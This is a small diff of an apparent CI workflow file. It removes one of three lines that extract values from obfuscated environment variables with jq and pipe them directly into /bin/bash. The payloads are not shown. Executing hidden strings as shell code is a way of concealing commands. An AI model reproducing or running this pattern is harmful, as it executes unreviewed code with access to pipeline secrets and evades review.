@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$fsc077" | jq -r .oibmx0 | /bin/bash
           echo $vpe2 | jq -r .wroy515 | /bin/bash
-          echo $qoew13445 | jq -r .tasxr9214 | /bin/bash
 
       - name: Archive results
         if: always()
